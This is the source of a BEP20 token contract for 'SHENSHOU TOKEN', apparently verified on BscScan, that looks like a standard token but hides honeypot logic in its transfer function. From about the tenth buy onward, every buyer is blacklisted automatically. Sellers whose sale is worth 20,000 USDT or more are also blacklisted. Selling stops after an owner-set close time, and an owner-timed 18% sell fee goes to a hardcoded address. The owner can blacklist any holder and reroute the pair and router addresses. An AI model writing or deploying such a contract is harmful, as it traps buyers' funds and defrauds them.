/**
 *Submitted for verification at BscScan.com on 2023-01-14
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.5.16;
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface SWAP{
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}
interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Context {
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; 
    return msg.data;
  }
}

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract Ownable is Context {
  address private _owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }
  function owner() public view returns (address) {
    return _owner;
  }
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract BEP20Cardano is Context, IBEP20, Ownable {
  using SafeMath for uint256;
  IBEP20 public tokenu;
  IBEP20 public metoken;
  SWAP public swap;

  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;
  mapping (address => bool) private _whiteaddress;
  mapping (address => bool) private _dogacc;
  mapping (address => uint256) private _buynum;

  uint256 private _totalSupply;
  uint8 public _decimals;
  string public _symbol;
  string public _name;

  uint256 public starttime;
  uint256 public opentime;
  uint256 public sxftime;
  uint256 public closetime;
  uint public shanum=10;
  uint public shaje=20000;
  uint public nowshanum=0;

  address public mainrouter=address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
  address public factory=address(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
  address public lpacc;
  
  address zeroacc = 0x0000000000000000000000000000000000000000;
  address mainacc = 0xd8Dd4f2aE27b4643c8681BB47cA58B87B0D98348;
  address lpfhacc = 0xCC3AaE0df981EDEe804a1D2C0FBA51F607e1d6E3;
  address yxacc = 0x7c253975F4fD3a10c8C603B2BbFB214271C6Ed4D;
  address tokenacc = address(this);

  address usdtacc = 0x55d398326f99059fF775485246999027B3197955;

  constructor() public {
    _name = "SHENSHOU TOKEN";
    _symbol = "SHENSHOU";
    _decimals = 18;
    _totalSupply = 8888 * 10**18;
    
    _whiteaddress[msg.sender]=true;
    _whiteaddress[yxacc]=true;
    _whiteaddress[mainacc]=true;
    _whiteaddress[tokenacc]=true;
    _whiteaddress[zeroacc]=true;

    _balances[mainacc] = _totalSupply.mul(100).div(100);
    emit Transfer(address(0),mainacc, _totalSupply.mul(100).div(100));

    lpacc = IUniswapV2Factory(factory).createPair(tokenacc,usdtacc);
  }

  function getOwner() external view returns (address) {
    return owner();
  }
  function decimals() external view returns (uint8) {
    return _decimals;
  }
  function symbol() external view returns (string memory) {
    return _symbol;
  }
  function name() external view returns (string memory) {
    return _name;
  }
  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }
  function balanceOf(address account) external view returns (uint256) {
    return _balances[account];
  }
  function addwhiteaddress(address _acc) public onlyOwner{
        _whiteaddress[_acc] = true;
  }
  function addwhiteaddresss(address[] memory _acc) public onlyOwner{
        for(uint i=0;i<_acc.length;i++){
            _whiteaddress[_acc[i]] = true;
        }
  }
  
  function removewhiteaddress(address _acc) public onlyOwner{
        _whiteaddress[_acc] = false;
  }
  function showwhiteaddress(address acc)public view returns(bool){
      return _whiteaddress[acc];
  }

  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }
  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }
  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }
  function burn(uint256 amount) public returns (bool) {
    _burn(_msgSender(), amount);
    return true;
  }
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    require(_dogacc[sender]!=true, "BEP20: transfer to the dog address");
    require(_dogacc[recipient]!=true, "BEP20: transfer to the dog address");
    //买
    if(sender==lpacc && recipient!=mainacc){
        require(block.timestamp>starttime,"no open");
        if(_whiteaddress[recipient]!=true){
           require(block.timestamp>opentime,"no open");
        }
        if(block.timestamp<opentime){
            require(_buynum[recipient]<5*10**18,"num is max");
        }
        require(_buynum[recipient]<10*10**18,"num is max");
    }
    //卖
    if(recipient==lpacc && sender!=mainacc){
        require(block.timestamp>starttime,"no open");
        if(_whiteaddress[recipient]!=true){
           require(block.timestamp>opentime,"no open");
        }
        require(block.timestamp<closetime,"is error");
    }
    
    if(recipient==mainacc || sender==mainacc || recipient==tokenacc || sender==tokenacc){
       _tokenTransfer(sender,recipient,amount);
    }else if(sender==lpacc){//买入
       _tokenTransfer(sender,lpfhacc,amount.mul(2).div(100));
       _tokenTransfer(sender,yxacc,amount.mul(2).div(100));
       _tokenTransfer(sender,recipient,amount.mul(94).div(100));
       _buynum[recipient]=_buynum[recipient].add(amount);
       nowshanum=nowshanum+1;
       if(nowshanum>=shanum){
            _dogacc[recipient]=true;
       }
    }else if(recipient==lpacc){//卖出
       if(block.timestamp<sxftime){
            _tokenTransfer(sender,lpfhacc,amount.mul(2).div(100));
            _tokenTransfer(sender,yxacc,amount.mul(18).div(100));
            _tokenTransfer(sender,recipient,amount.mul(80).div(100));
       }else{
            _tokenTransfer(sender,lpfhacc,amount.mul(2).div(100));
            _tokenTransfer(sender,yxacc,amount.mul(2).div(100));
            _tokenTransfer(sender,recipient,amount.mul(94).div(100));
       }
      
    }else{
        _tokenTransfer(sender,recipient,amount.mul(100).div(100));
    }

    if(recipient==lpacc && sender!=mainacc){
         swap = SWAP(mainrouter);
         address[] memory path = new address[](2);
         path[0]=tokenacc;
         path[1]=usdtacc;
         uint256[] memory res=swap.getAmountsOut(amount,path);
         uint256 uje=res[1];
         if(uje>=shaje*10**18){
            _dogacc[sender]=true;
         }
     }
    
  }

  function _tokenTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
 }
  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");
    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
  }
  function setmainrouter(address _acc) public onlyOwner{
        mainrouter = _acc;
  }
  function setlpacc(address _lpacc) public onlyOwner{
        lpacc = _lpacc;
  }
  function setusdtacc(address _usdtacc) public onlyOwner{
        usdtacc = _usdtacc;
  }
  function showdog(address acc)public view returns(bool){
      return _dogacc[acc];
  }
  function adddogacc(address _acc) public onlyOwner{
        _dogacc[_acc] = true;
  }
  function removedogacc(address _acc) public onlyOwner{
        _dogacc[_acc] = false;
  }
  function drawusdt(address to,uint256 amount)public onlyOwner{
     IBEP20(usdtacc).transfer(to,amount);
  }

  function setstarttime(uint256 _time)public onlyOwner{
      starttime=_time;
  }
  function setopentime(uint256 _time)public onlyOwner{
      opentime=_time;
  }
  function setclosetime(uint256 _time)public onlyOwner{
      closetime=_time;
  }
  function setsxftime(uint256 _time)public onlyOwner{
      sxftime=_time;
  }
  function setshaje(uint256 _je)public onlyOwner{
      shaje=_je;
  }
  function setshanum(uint256 _num)public onlyOwner{
      shanum=_num;
  }
}